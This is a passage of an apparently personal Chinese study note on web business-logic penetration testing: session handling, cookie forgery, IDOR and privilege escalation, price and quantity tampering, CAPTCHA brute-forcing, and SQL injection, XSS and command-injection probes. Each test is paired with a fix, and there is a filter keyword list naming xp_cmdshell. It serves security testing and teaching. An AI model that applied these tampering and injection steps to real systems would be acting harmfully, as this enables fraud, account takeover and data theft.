title="测试原理和方法"></a>测试原理和方法</h3><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户退出应用系统时，应将客户端Session认证属性标识清空。如果未能清空客户端Session标识，在下次登录系统时，系统会重复利用该Session标识进行认证会话。攻击者可利用该漏洞生成固定Session会话，并诱骗用户利用攻击者生成的固定会话进行系统登录，从而导致用户会话认证被窃取。</p><h3 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h3><p>在注销退出系统时，对当前浏览器授权SessionID值进行记录，再次登录系统，将本次授权SessionID值与上次进行比对校验。判断服务器是否与上次相同的SessionID值进行授权认证，若使用相同SessionID值则存在固定会话风险。</p><ul><li>在已登录授权认证的页面中退出系统</li><li>使用bp截取退出系统的请求数据，记录本次授权的SessionID</li><li>重新登录系统，bp截取登录授权请求数据，与上次的SessionID值比较判断是否相同</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>在客户端登录系统时，应首先判断客户端是否提交浏览器的留存Session认证会话属性标识，客户端提交此信息至服务器时，应及时销毁浏览器留存的Session认证会话，并要求客户端浏览器重新生成Session认证会话属性标识。</p><h2 id="Session会话注销测试"><a href="#Session会话注销测试" class="headerlink" title="Session会话注销测试"></a>Session会话注销测试</h2><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户注销或退出应用系统时，系统应将客户端Session认证属性标识清空，如果未能清空Session认证会话，该认证会话，将持续有效，此时攻击者获得该Session认证会话会导致用户权限被盗取。</p><h3 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h3><p>用户退出系统授权后，判断授权认证SessionID值是否依然有效，若授权认证SessionID依然有效则存在风险。</p><ul><li>对已登录授权的系统页面使用Bp进行截取，保存SessionID值</li><li>将数据包发送到Repeater模块中</li><li>在已授权的页面中退出系统。</li><li>重发数据包，并查看系统是否对推出后得到用户授权Session今年解除授权。</li></ul><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>在用户注销或退出应用系统时，服务器应及时销毁Session认证会话信息并清空客户端浏览器Session属性标识。</p><h2 id="Session会话超时事件测试"><a href="#Session会话超时事件测试" class="headerlink" title="Session会话超时事件测试"></a>Session会话超时事件测试</h2><p>在用户成功登录系统获得Session认证会话，该Session认证会话应具有生命周期，即用户在成功登录系统后，在固定时间内该用户与服务器无任何交互操作，应销毁该用户Session认证会话信息，要求用户重新登录系统认证。</p><h3 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统会话授权认证时长进行测试，并根据系统承载的业务需求来分析判断当前系统会话授权认证时间是否过长。</p><ul><li>对已登录授权的系统页面使用bp工具进行请求数据截取，将数据包中Session认证参数值进行保存记录。</li><li>发送到Repeater中，三十分钟后重发，看能否继续查阅信息</li></ul><h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>对每个生成的Session认证会话配置生命周期，从而有效降低因用户会话认证时间过长而导致的信息泄露风险。</p><h2 id="Cookie仿冒测试"><a href="#Cookie仿冒测试" class="headerlink" title="Cookie仿冒测试"></a>Cookie仿冒测试</h2><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在cookie中，并发送至客户端存储。攻击者通过尝试修改cookie中的身份标识，从而达到仿冒其他用户身份的目的，并拥有相关用户的所有权限。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对系统会话授权认证cookie中会话身份认证标识进行篡改测试，通过篡改身份认证标识值来判断能否改变用户身份会话。</p><ul><li>使用李雷账号登录系统并进行浏览器页面刷新</li><li>使用bp对本次页面刷新请求数据进行截取，并将请求数据cookie中的userid值修改为admin进行提交。</li><li>查看提交后的返回信息，账号身份授权被修改成管理员</li></ul><h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对客户端标识的用户敏感信息数据，使用Session会话认证方式，避免被他人仿冒身份</p><h2 id="密文比对认证测试"><a href="#密文比对认证测试" class="headerlink" title="密文比对认证测试"></a>密文比对认证测试</h2><p>在系统登录时密码加密流程一般是先将用户名和密码发送到服务器，服务器会把用户提交的密码经过hash算法加密后和数据库中存储的加密值比对，如果加密值相同，则判定用户提交密码正确。</p><p>但有些网站系统的流程是在前台浏览器客户端对密码进行hash加密后传输给服务器并与数据库加密值进行对比，如果加密值相同，则判定用户提交密码正确，此流程会泄露密码加密方式导致出现安全隐患。</p><h3 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统敏感数据加密流程进行测试，判断加密过程或方式是否为客户端加密方式。</p><ul><li>bp抓包，根据页面代码分析后证实登录传输口令使用Hash MD5加密算法加密<ul><li>bp抓包，查看web系统登录提交密码为加密后的密文传输</li><li>通过对页面代码分析得出web系统登录口令加密处理过程是由本地js脚本来完成，方式为md5。</li></ul></li><li>用bp爆破，添加配置项payloadProcessing，将要破解的密码值进行数据处理转换。</li></ul><h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>将密码加密过程及密文比对过程防止在服务器后台执行，发送用户名和密码到服务器后台，后台对用户提交的密码经过md5算法加密后和数据库中存储的md5密码值进行比对，如果加密值相同，则允许用户登录</p><h2 id="登录失败信息测试"><a href="#登录失败信息测试" class="headerlink" title="登录失败信息测试"></a>登录失败信息测试</h2><p>在用户登录系统失败时，系统会在页面显示用户登录失败信息，若提交账号在系统中不存在，系统提示“用户名不存”、“账号不存在”等明确信息，假如提交账号在系统中存在，则系统提示“密码错误”等间接提示信息，攻击者可根据此类登录失败提示信息来判断当前登录账号是否在系统中存在，从而进行有针对性的暴力破解口令测试</p><h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><p>对系统登录失败提示语句表达内容进行统一的模糊描述，从而提高攻击者对登录系统用户名及密码的可猜测难度。</p><h1 id="业务办理模块测试"><a href="#业务办理模块测试" class="headerlink" title="业务办理模块测试"></a>业务办理模块测试</h1><h2 id="订单ID篡改测试"><a href="#订单ID篡改测试" class="headerlink" title="订单ID篡改测试"></a>订单ID篡改测试</h2><p>开发人员没考虑登录后用户间权限间隔问题，就会导致水平越权。</p><h3 id="测试过程-5"><a href="#测试过程-5" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录李先生账号，查看本人保单，抓包修改保单号，即可越权查看他人保单内容。</p><p>在返回的数据包中，包含全部在界面中被隐藏的身份证号等敏感信息。</p><h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台查看订单时要通过Session机制判断用户身份，做好平行权限控制，服务端需要校验相应订单是否和登录者身份一致，防止水平越权泄露用户敏感个人信息。</p><h2 id="手机号码篡改测试"><a href="#手机号码篡改测试" class="headerlink" title="手机号码篡改测试"></a>手机号码篡改测试</h2><p>手机号通常可以代表一个用户身份，当请求中发现有手机号参数时，我们可以试着修改它，测试是否存在越权漏洞，系统登录功能一般先判断用户名和密码是否正确，通过Session机制赋予用户令牌，但是在登录后的某些操作某些功能时，抓包或通过其他方式尝试篡改手机号，即可对此类问题进行测试。</p><h3 id="测试过程-6"><a href="#测试过程-6" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录后在操作某些功能时抓包，篡改手机号进行测试。</p><ul><li>以尾号0136手机号登录，选择挂失业务。</li><li>抓包修改手机号为另一个手机号尾号9793</li><li>手机号码参数篡改成功，成功挂失尾号9793</li></ul><h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台请求要通过Session机制判断用户身份，如果需要客户端传输手机号码，则服务端需要校验手机号是否和登录者的身份一致，如发现不一致则拒绝将请求，防止水平越权，对于手机app程序，不要过于相信从手机中直接读取的手机号码，要做常规的身份认证，规范登录流程防止未授权登录</p><h2 id="用户ID篡改测试（水平越权）"><a href="#用户ID篡改测试（水平越权）" class="headerlink" title="用户ID篡改测试（水平越权）"></a>用户ID篡改测试（水平越权）</h2><p>从开发角度，用户登录后查看个人信息时，需要通过sessionid判定用户身份，然后显示相应用户的个人信息，但有时我们发现在get或post请求中有userid这类参数传输，并且后台通过此参数显示对应用户隐私信息，这就导致攻击者可以通过篡改用户Id越权访问其他用户隐私信息。</p><h3 id="测试过程-7"><a href="#测试过程-7" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录，点击收货地址修改，抓包，发现关键参数deliverID，修改为其他，提交后返回非本账户的联系人相关信息</p><h3 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台功能请求要通过Session机制判断用户身份，不要相信客户端传来的用户ID,如果确实需要客户端传输userid，则服务端需要校验userid是否和登录者的Session身份一致，防止被攻击者篡改，未授权访问他人账号内容</p><h2 id="邮箱和用户篡改测试（水平越权）"><a href="#邮箱和用户篡改测试（水平越权）" class="headerlink" title="邮箱和用户篡改测试（水平越权）"></a>邮箱和用户篡改测试（水平越权）</h2><p>在发送邮件或站内消息时，篡改其中的发件人参数，导致攻击者可以伪造发信人进行钓鱼攻击等操作，用户登录成功后拥有发信权限，开发者就信任了客户端传来的发件人参数，导致业务安全问题出现。</p><h3 id="测试过程-8"><a href="#测试过程-8" class="headerlink" title="测试过程"></a>测试过程</h3><p>编写邮件点击发送，bp抓包，修改发件人参数inputFron，并提交发送邮件，收件时，发现发件人被篡改成功。</p><h3 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h3><p>用户登录后写信、发送信息时需要通过Session机制判断用户身份，如果需要客户端传输邮箱、发件人，服务端需要校验邮箱、发件人是否和登录者的身份一致，防止被攻击者篡改用于钓鱼攻击。</p><h2 id="商品编号篡改测试"><a href="#商品编号篡改测试" class="headerlink" title="商品编号篡改测试"></a>商品编号篡改测试</h2><p>修改上皮内金额，篡改商品编号，低价购买高价商品。</p><h3 id="测试过程-9"><a href="#测试过程-9" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>登录积分商城，挑选一个商品，编号为goods_id=xxx5ff7,需要30积分。</li><li>选择5积分商品，抓包修改goods_id，替换为xxx5ff7，替换成功，用5积分购买了30积分商品。</li></ul><h3 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议商品金额不要在客户端传入，防止被篡改，或确实需要在客户端传入金额，则服务端在收到请求后必须检查商品价格与交易金额一直，或对支付金额做签名校验。</p><h2 id="竞争条件测试"><a href="#竞争条件测试" class="headerlink" title="竞争条件测试"></a>竞争条件测试</h2><p>竞争条件：当两个或多个进程试图在同一时刻访问共享内存，或读写某些共享数据时，最后的竞争结果，取决于线程执行的顺序（线程运行时序），成为竞争条件。</p><p>在web安全中，在服务端逻辑与数据库读写存在时序问题时，就可能存在竞争条件漏洞，攻击者通常利用多线程并发请求，在数据库中的余额字段更新之前，多次兑换积分或购买商品，从中获利。</p><h3 id="测试过程（教程只写了漏洞没写测试漏洞）"><a href="#测试过程（教程只写了漏洞没写测试漏洞）" class="headerlink" title="测试过程（教程只写了漏洞没写测试漏洞）"></a>测试过程（教程只写了漏洞没写测试漏洞）</h3><p>攻击者在提交订单时抓包，设置很多个线程重放此包，在众多请求中，个别请求就有可能争取绕过金额，次数的判断，交易成功，攻击者从中获利。</p><h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><p>在处理订单、支付等关键业务时，使用悲观锁或乐观锁保证事务的ACID特性（原子性、一致性、隔离性、持久性），并避免数据脏读（一个事务读取了另一个事务未提交的数据），解决竞争条件和并发操作可能带来的相关业务问题</p><h1 id="业务授权访问模块"><a href="#业务授权访问模块" class="headerlink" title="业务授权访问模块"></a>业务授权访问模块</h1><h2 id="非授权访问测试"><a href="#非授权访问测试" class="headerlink" title="非授权访问测试"></a>非授权访问测试</h2><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息，可以尝试在登录某网站前台或后台之后，将相关的页面链接复制到其他浏览器或其他电脑上进行访问</p><h3 id="测试过程-10"><a href="#测试过程-10" class="headerlink" title="测试过程"></a>测试过程</h3><p>在ie浏览器中登录某网站进行交费，复制缴费成功的url，在火狐浏览器里访问，成功访问</p><h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露，所以对未授权访问页面做Session认证，并对用户访问的每一个url做身份鉴别，正确地校验用户ID及Token等。</p><h2 id="越权测试"><a href="#越权测试" class="headerlink" title="越权测试"></a>越权测试</h2><p>水平越权：相同权限的不同用户可以互相访问</p><p>垂直越权：使用权限低的用户可以访问权限较高的用户</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul><li>保存用户任务ID,抓包看到请求中关键参数ID,若可以更改能看到其他提交者，则存在水平越权漏洞，爆破自动更改关键参数ID.</li></ul><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录一个普通用户，超级管理员账号为admin，找到修改密码，将密码改为789，确定修改，抓包，发现两个参数，uid和pwd，即用户名和密码，将uid值改为admin，密码789不变。</p><p>提交修改后的数据包提示密码修改成功，登录管理员账号成功。</p><h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端需校验身份唯一性，自己的身份只能查看、修改、删除、添加自己的信息</p><h1 id="输入-x2F-输出模块测试"><a href="#输入-x2F-输出模块测试" class="headerlink" title="输入/输出模块测试"></a>输入/输出模块测试</h1><h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><p>sql注入就是通过把sql命令插入web表单提交或输入域名页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令的目的。</p><p>按照请求类型分为：get型，post型，cookie型。</p><p>get和post区别是由表单的提交方式决定的，按照数据类型可分为数字型和字符型，数字型不用闭合前面的sql语句，字符型需要闭合。</p><p>测试方法分为报错型、延时型、盲注型、布尔型等。</p><p>数字型注入测试方法如下：</p><ul><li>正常请求，查看页面</li><li>在请求的参数后加and 1=1，如果可以添加执行，则和第一步的返回页面并无差异。</li><li>在请求参数后加and 1=2，如果返回页面与第二步页面明显不同，或有所差异，则断定存在数字型注入</li></ul><p>字符型注入测试方法如下：</p><ul><li>正常请求查看页面（如查询admin用户信息，则返回admin用户的信息）</li><li>在查询的参数后加 <code>'or 1=1</code>,加单引号的目的是闭合前面的sql语句并与后面的语句形成语法正确的sql语句，如果可以添加并能够执行，则返回除admin用户外所有用户的信息，这时可以判断存在字符型注入。</li></ul><h3 id="测试过程-11"><a href="#测试过程-11" class="headerlink" title="测试过程"></a>测试过程</h3><p>略</p><h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（JSP、ASP、ASPX、PHP等）生成的客户端页面、提交的表单（FORM）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li>Sql语句关键词：and,or ,select,declare,update,xp_cmdshell;</li><li>sql语句特殊符号<code>'、</code>，<code>''、</code>等</li></ul><p>web应用系统接入数据库服务器使用的用户不应为系统管理员，用户角色应遵循最小权限原则。</p><h2 id="XSS测试"><a href="#XSS测试" class="headerlink" title="XSS测试"></a>XSS测试</h2><p>跨站脚本漏洞是web应用程序在将数据输出到网页的时候存在问题，导致恶意攻击者可以在往web页面里插入而已js,html代码，并将构造的而已数据显示在页面的漏洞中。攻击者一般利用此漏洞窃取或操纵客户会话和cookie，用于模仿合法用户，从而使攻击者以该用户身份查看或变更与用户记录以及执行事务。</p><p>跨站一般情况下主要分为存储型xss，反射性xss，DOM型跨站。</p><p>存储型xss脚本可直接写入服务端数据库，反射性不写入数据库，由服务端解析后在浏览器生成一段类似<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>的脚本。</p><p>反射性跨站测试主要是在url或输入框内插入一段跨站脚本，观察是否能弹出对话框。</p><p>存储型xss主要是在网站的留言板、投诉、建议等输入框内输入一段跨站脚本，看能否插入数据库，插入成功的表现为当网站管理人员查看该留言时，会执行跨站语句，或者当普通用户再次1访问该页面时，会执行跨站语句，如弹出对话框。</p><h3 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（jsp,asp,aspx,php）生成的客户端页面、提交的表单（form）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li><p>HTML标签的<code>&lt;、“、’、%</code>等，以及这些符号的Unicode值</p></li><li><p>客户端脚本<code>（JavaScript、VBScript）</code>关键字：<code>JavaScript、script</code>等。</p></li><li><p>对于信息搜索功能，不应在搜索结果页面中回显搜索内容。同时应设置出错页面，防止Web服务器发生内部错误时，将错误信息返回给客户端</p></li><li><p>定义允许的行为，确保Web应用程序根据预期结果的严格定义来验证所有输入参数（Cookie、标头、查询字符串、表单、隐藏字段等）。</p></li><li><p>检查POST和GET请求的响应，以确保返回的对象是预期的内容且有效</p></li><li><p>通过对用户提供的数据进行编码，从用户输入中移除冲突的字符、括号和单双引号。这将防止插入的脚本以可执行的格式发送给最终用户。</p></li><li><p>只要可能，就应将客户端提供的所有数据限制为字母数字数据。使用此过滤机制时，如果用户输入<code>“&lt;script&gt;alertdocumentcookie（'aaa'）&lt;/script&gt;”</code>，将缩减为<code>“scriptalertdocumentcookiescript”</code>。如果必须使用非字母数字字符，请先将其编码为HTML 实体，然后再将其用在HTTP响应中，这样就无法将它们用于修改HTML文档的结构。</p></li><li><p>使用双因素客户身份验证机制，而非单因素身份验证</p></li><li><p>在修改或使用脚本之前，验证脚本的来源。</p></li><li><p>不要完全信任其他人提供的脚本并用在自己的代码中</p></li></ul><h2 id="命令执行测试"><a href="#命令执行测试" class="headerlink" title="命令执行测试"></a>命令执行测试</h2><p>在应用需要调用一些外部程序去处理内容的情况下，会用到一些执行系统命令的函数，如php中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。测试中如果没有对参数（cmd=、command、excute=等）进行过滤，就可以直接造成命令执行漏洞或配合绕过及命令连接符（<code>&amp;、|、||、；</code>）等进行命令执行漏洞测试</p><h3 id="测试过程-12"><a href="#测试过程-12" class="headerlink" title="测试过程"></a>测试过程</h3><p>由于未对register_key参数进行过滤可能存在命令执行漏洞，抓包并对其进行测试，构造命令执行语句并执行成功，证明此参数为经严格过滤造成命令执行漏洞。</p><p>（略，哪天找时间搭一个dvwa靶场）</p><h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><p>尽量少用执行命令的函数或者直接禁用，参数值尽量使用引号包括在使用动态函数之前，确保使用的函数是指定的函数之一，在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义。</p><h1 id="回退模块测试"><a href="#回退模块测试" class="headerlink" title="回退模块测试"></a>回退模块测试</h1><h2 id="回退测试"><a href="#回退测试" class="headerlink" title="回退测试"></a>回退测试</h2><p>web业务在密码修改成功后或者订单付款成功后等业务模块，在返回上一步重新修改密码或者重新付款时存在重新设置密码或者付款的功能，这时如果能返回上一步重复操作，而且还能更改或者重置结果，则存在业务回退漏洞。</p><h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于业务流程有多步的情况，如修改密码或重置密码等业务，首先判断该步骤的请求是否是上一步骤的业务所发起的，如果不是则返回错误提示或页面失效。</p><h1 id="验证码机制测试"><a href="#验证码机制测试" class="headerlink" title="验证码机制测试"></a>验证码机制测试</h1><h2 id="验证码暴力破解测试"><a href="#验证码暴力破解测试" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>验证码机制主要被用于防止暴力破解，防止DDoS攻击，识别用户身份等，常见的验证码主要有图片验证码、邮件验证码、短信验证码、滑动验证码和语音验证码.</p><h3 id="测试过程-13"><a href="#测试过程-13" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者填写任意手机号进行性注册，服务器向攻击者填写的手机号码发送短信验证，攻击者设置验证码范围，对验证码进行暴力破解，通过返回数据包判断是否破解成功，然后通过破解成功的验证码完成注册。</p><h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>设置验证码的失效时间，建议为180秒</li><li>限制单位时间内验证码的失败尝试次数，如五分钟内连续失败5次即锁定该账号15分钟</li></ul><h2 id="验证码重复使用测试"><a href="#验证码重复使用测试" class="headerlink" title="验证码重复使用测试"></a>验证码重复使用测试</h2><p>在网站的登录或评论等页面，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用，测试时可以抓取携带验证码的数据包重复提交，查看是否提交成功。</p><h3 id="测试过程-14"><a href="#测试过程-14" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者填写投诉建议，输入页面验证码，抓取提交的数据包，使用发包工具对数据包进行重复提交，然后查看投诉建议页面是否成功提交了多个投诉信息。</p><p>输入内容，输入验证码，抓数据包，并修改内容参数的值，通过bp重复提交投诉信息，经过暴力重复提交，客户端显示提交成功，用首次验证码成功多次提交</p><h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><p>针对验证认证次数问题，建议验证码在一次认证成功后，服务端清空认证成功的Session，有效防止一次认证反复使用的问题</p><h2 id="验证码客户端回显测试"><a href="#验证码客户端回显测试" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>当验证码在客户端生成而非服务器端生成时，就会造成该问题，当客户端需要和服务端进行交互发送验证码时，可借助浏览器的工具查看客户端与服务器进行交互的详细信息</p><h3 id="测试过程-15"><a href="#测试过程-15" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入找回密码页面，输入手机号与证件号，获取验证码，服务器会向手机发送验证码，通过浏览器工具查看返回包信息，如果返回包中含验证码，证明存在此类问题。</p><h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>禁止验证码在本地客户端生成，应采用服务器端验证码生成机制</li><li>设置验证码的时效性，如180秒过期</li><li>验证码应随机生成，且使用一次即失效</li></ul><h2 id="验证码绕过测试"><a href="#验证码绕过测试" class="headerlink" title="验证码绕过测试"></a>验证码绕过测试</h2><p>通过修改提交服务器返回的数据，可以实现绕过验证码，执行我们的请求</p><h3 id="测试过程-16"><a href="#测试过程-16" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入注册账户页面，输入任意手机号码，获取验证码，在注册账户页面填写任意验证码，提交请求并抓包，使用抓包工具查看并修改返回包信息，转发返回数据包，查看是否注册成功。</p><h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务端增加验证码的认证机制，对客户端提交的验证码进行二次校验。</p><h2 id="验证码自动识别测试"><a href="#验证码自动识别测试" class="headerlink" title="验证码自动识别测试"></a>验证码自动识别测试</h2><p>以图形验证码为例，一般队医此类验证码的识别流程为：图像二值化处理-&gt;去干扰-&gt;字符分割-&gt;字符识别</p><p>图像二值化就是将图像上像素点的灰度值设置为0或255，也就是将整个图像呈现出明显的黑白效果</p><p>为防止验证码被自动识别，通常加入一些点、线、色彩之类的方式进行图像干扰。</p><p>字符分割主要包括从验证码图像中分割出字符区域，以及把字符区域划分成单个字符</p><p>字符识别就是把处理后的图片还原回字符文本的过程。</p><h3 id="测试过程-17"><a href="#测试过程-17" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问网站登录页面，通过刷新你验证码页面查看验证码组成规律，进行图像二值化、去干扰等处理，并进行人工对比，存储成功识别的验证码包，截入工具，利用工具对登录页面进行暴力破解，根据返回包的大小和关键字判断是否破解成功。</p><p>用bp抓登录包，将登录包放在PKAV HTTP Fuzzer工具的请求包中，设置验证码标志位，用户名和密码标志位。</p><p>进行验证码爆破，发现长度为611的返回包，可成功登录网站。</p><h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>增加背景元素的干扰，如背景色，背景字母等</li><li>字符的字体进行扭曲、粘连</li><li>使用公式、逻辑验证方法等作为验证码，如四则运算法、问答题等</li><li>图形验证码和使用者相关，比如选择联系人头像、选择购买过的物品等作为验证码</li></ul><h1 id="业务数据安全测试"><a href="#业务数据安全测试" class="headerlink" title="业务数据安全测试"></a>业务数据安全测试</h1><h2 id="商品支付金额篡改测试"><a href="#商品支付金额篡改测试" class="headerlink" title="商品支付金额篡改测试"></a>商品支付金额篡改测试</h2><p>通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞</p><h3 id="测试过程-18"><a href="#测试过程-18" class="headerlink" title="测试过程"></a>测试过程</h3><p>该测试主要针对订单生成过程中存在商品支付金额校验不完整而产生业务安全风险点，通常导致攻击者用实际支付远低于订单支付的金额订购商品的业务逻辑漏洞。</p><p>选择购卡面值进入支付平台，抓包篡改支付请求中明文金额字段，跳转支付平台，完成篡改后订单金额支付流程</p><h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣等原始数据的校验应来自于服务器端，不应接受客户端传递过来的值</p><h2 id="商品订购数量篡改测试"><a href="#商品订购数量篡改测试" class="headerlink" title="商品订购数量篡改测试"></a>商品订购数量篡改测试</h2><p>商品数量篡改测试是通过在业务流程中抓包修改订购商品数量等字段，如将请求中的商品数量修改成任意非预期数额、负数等后进行提交，查看业务系统能否以修改后的数量完成业务流程。</p><h3 id="测试过程-19"><a href="#测试过程-19" class="headerlink" title="测试过程"></a>测试过程</h3><p>将商品放入购物车，在购物车中进行礼品兑换，确认商品订单准备进行数据包信息篡改，抓包，将商品数量参数改为负数，并保存，</p><p>可以看到购物车中实际支付积分已经变为负积分。</p><p>添加配送信息，确认订单信息，获取验证码后通过，进入订单确认页面，提交订单订购请求。</p><h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端应当考虑交易风险控制，对产生异常情况的交易行为（如用户积分数额为负值、兑换库存数量为0的商品等）应当直接予以限制、阻断，而非继续完成整个交易流程</p><h2 id="前端JS限制绕过测试"><a href="#前端JS限制绕过测试" class="headerlink" title="前端JS限制绕过测试"></a>前端JS限制绕过测试</h2><p>商品在限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓取客户端发送的请求包修改JS端生成处理的交易数据，如将请求中的商品数量改为大于最大数限制的值，查看能否以非正常业务交易数据完成业务流程。</p><h3 id="测试过程-20"><a href="#测试过程-20" class="headerlink" title="测试过程"></a>测试过程</h3><p>该项测试主要针对电商平台由于交易限制机制不严谨、不完善而导致的一些业务逻辑问题</p><p>购买限购商品，数量为2份，加入购物车。</p><p>客户端在前端浏览器使用js做了购买限制，尝试绕过限制提交购买请求，可以通过抓包修改数量字段，改为100个后成功提交。</p><h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣、数量等原始数据的校验应来自于服务器端，不应该完全相信客户端传递过来的值。类似的跨平台支付业务，涉及平台之间接口调用，一定要做好对重要数据的完整性校验，确保业务重要数据在平台间传输的一致。</p><h2 id="请求重放测试（不理解）"><a href="#请求重放测试（不理解）" class="headerlink" title="请求重放测试（不理解）"></a>请求重放测试（不理解）</h2><p>商品首次购买成功后，参照订购商品的正常流程请求，进行完全模拟正常订购业务流程的重放操作，可以实现一次购买多次收获等违背正常业务逻辑的结果。</p><h3 id="测试过程-21"><a href="#测试过程-21" class="headerlink" title="测试过程"></a>测试过程</h3><p>在生成订单流程时抓取订购请求，观察每次订购相同商品的请求是否存在不同的随机token、可变参数等，若有则检查这些随机数的变化情况和失效请款，是否在当前订购流程中唯一有效。</p><p>尝试重放之前已经完成流程的订购请求，观察服务器端是否做出正确响应，若订购再次生效，订单再次生成则表明服务器存在脆弱性。</p><h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><p>用户每次订单token不应该能重复提交，避免产生重放订购请求的情况。在服务器订单生成关键环节，应该对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验。</p><h2 id="业务上限测试"><a href="#业务上限测试" class="headerlink" title="业务上限测试"></a>业务上限测试</h2><p>业务上限测试主要是针对一些电商类应用程序在进行业务办理流程中，服务端没有对用户提交的查询范围、订单数量、金额等数据进行严格校验而引发的一些业务逻辑漏洞。在业务流程中通过向服务端提交高于或低于预期的数据以校验服务端是否对所提交的数据做预期强校验。存在此类脆弱性的应用程序，通常表现为查询到超出预期的信息、订购或兑换超过预期范围的商品等。</p><h3 id="测试过程-22"><a href="#测试过程-22" class="headerlink" title="测试过程"></a>测试过程</h3><p>判断应用程序是否对业务预期范围外的业务请求做出正确回应。</p><p>在业务查询中只允许登录用户查询6个月内受理记录，单抓包分析出查询请求中存在明文字段month，修改查询范围到6个月以上提交，可以成功，表明该功能不符合业务要求</p><h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务器端应对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验，服务端应考虑交易风险控制，对产生异常情况的交易行为直接予以限制、阻断，停止完成整个交易流程。</p><h1 id="业务流程乱序测试"><a href="#业务流程乱序测试" class="headerlink" 